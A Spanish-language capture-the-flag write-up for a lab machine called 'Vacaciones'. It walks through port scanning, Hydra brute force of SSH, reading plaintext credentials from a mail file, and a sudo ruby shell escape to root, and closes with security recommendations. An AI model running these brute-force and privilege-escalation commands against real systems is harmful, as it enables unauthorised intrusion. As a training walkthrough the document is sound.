Writeup - Máquina "Vacaciones"
Reconocimiento Inicial
Escaneo de Puertos
bash
nmap -sS -p- --min-rate 5000 192.168.x.x
Resultados:

text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Enumeración del Servicio Web (Puerto 80)
Análisis con Burp Suite
Interceptamos la petición HTTP al navegar al sitio web

Cambiamos el método HTTP de GET a POST

Encontramos un comentario HTML oculto:

html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
Usuarios Encontrados
Camilo - Usuario mencionado en el comentario

Juan - Remitente del mensaje

Fuerza Bruta al Servicio SSH
Ataque a Camilo
bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.x
Resultado: Contraseña encontrada: password1

Accedemos por SSH:

bash
ssh camilo@192.168.x.x
Password: password1
Escalada de Privilegios (Camilo)
Reconocimiento Inicial
bash
whoami
# camilo

id
# uid=1000(camilo) gid=1000(camilo) grupos=1000(camilo)

sudo -l
# No hay sudo access
Búsqueda de Pistas
Recordando el comentario sobre el "correo", investigamos:

bash
ls -la /var/mail/
# Encontramos: juan.txt

cat /var/mail/juan.txt
Contenido del correo:

text
Hola Camilo,

Te dejo mis credenciales por si las necesitas:
Usuario: juan
Contraseña: 2k84dicb

Saludos,
Juan
Acceso al Usuario Juan
bash
ssh juan@192.168.x.x
Password: 2k84dicb
Escalada Final (Juan → Root)
Verificación de Privilegios Sudo
bash
sudo -l
¡CRÍTICO! Encontramos:

text
User juan may run the following commands on c8c04d750b1b:
    (ALL) NOPASSWD: /usr/bin/ruby
Explotación del Binario Ruby
Con ayuda de herramientas de IA, identificamos el método de explotación:

bash
sudo ruby -e 'exec "/bin/bash"'
¡ÉXITO! Obtenemos shell como root:

bash
whoami
# root

id
# uid=0(root) gid=0(root) grupos=0(root)
Resumen de Credenciales
Usuario	Contraseña	Método de Obtención
camilo	password1	Fuerza bruta con Hydra
juan	2k84dicb	Lectura de /var/mail/juan.txt
root	N/A	Explotación de sudo ruby
Ruta de Explotación
Reconocimiento → Puertos 22 y 80 abiertos

Web → Método POST revela comentario oculto

Fuerza Bruta → Credenciales de Camilo (password1)

Post-Explotación → Lectura de correo en /var/mail/

Movimiento Lateral → Credenciales de Juan (2k84dicb)

Escalada → Abuso de sudo ruby para obtener root

Lecciones Aprendidas
Comentarios HTML pueden contener información sensible

/var/mail/ almacena correos del sistema

sudo -l siempre debe verificarse después de obtener acceso

Binarios con sudo NOPASSWD son vectores críticos de escalada

Ruby/Python/Perl con sudo pueden otorgar shell root directamente

Recomendaciones de Seguridad
Evitar comentarios sensibles en código HTML

Implementar autenticación de dos factores en SSH

Revisar y limitar privilegios sudo regularmente

Monitorear intentos de fuerza bruta

Usar contraseñas fuertes y únicas por usuario

Máquina Completada: ✅ Vacaciones
Dificultad: Media
Tiempo Estimado: 30-45 minutos
Categorías: Web, Fuerza Bruta, Escalada de Privilegios

